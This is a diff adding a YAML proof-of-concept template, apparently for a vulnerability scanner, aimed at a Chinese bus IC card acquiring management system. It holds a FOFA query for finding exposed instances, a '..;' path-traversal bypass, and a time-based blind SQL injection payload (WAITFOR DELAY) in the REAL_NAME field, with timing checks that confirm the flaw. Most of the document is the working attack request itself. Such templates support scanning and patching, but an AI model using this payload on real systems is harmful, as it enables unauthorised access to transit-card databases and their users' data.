@@ -1,0 +1,33 @@
+id: poc-yaml-bus-ic-user-sqli
+info:
+  name: 公交IC卡收单管理系统 REAL_NAME参数 sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 公交IC卡收单管理系统
+  fofa: app="公交IC卡收单管理系统"
+variables:
+  t1: random_int(3,5)
+  t2: t1*2
+  t3: t2 + 2
+  t4: random_int(1,3)
+  t5: t4*2
+  t6: t5 + 2
+requests:
+- method: POST
+  path: /assets/..;/user
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _search=false&nd=&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=1');WAITFOR%20DELAY%20'0:0:{{.t1}}'--&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
+  expression: "status_code == 200 && \ncontains(body,\"window.top.window.jQuery\"\
+    ) &&\ncontains(body,\"(\\\"#temporary_iframe_id\\\")\") &&\ncontains(body,\"\\\
+    \"pageCount\\\":0\") &&\nduration >= t2 &&\nduration <= t3 \n"
+- method: POST
+  path: /assets/..;/user
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _search=false&nd=&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=1');WAITFOR%20DELAY%20'0:0:{{.t4}}'--&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
+  expression: "status_code == 200 && \ncontains(body,\"window.top.window.jQuery\"\
+    ) &&\ncontains(body,\"(\\\"#temporary_iframe_id\\\")\") &&\ncontains(body,\"\\\
+    \"pageCount\\\":0\") &&\nduration >= t5 &&\nduration <= t6\n"
+transport: http
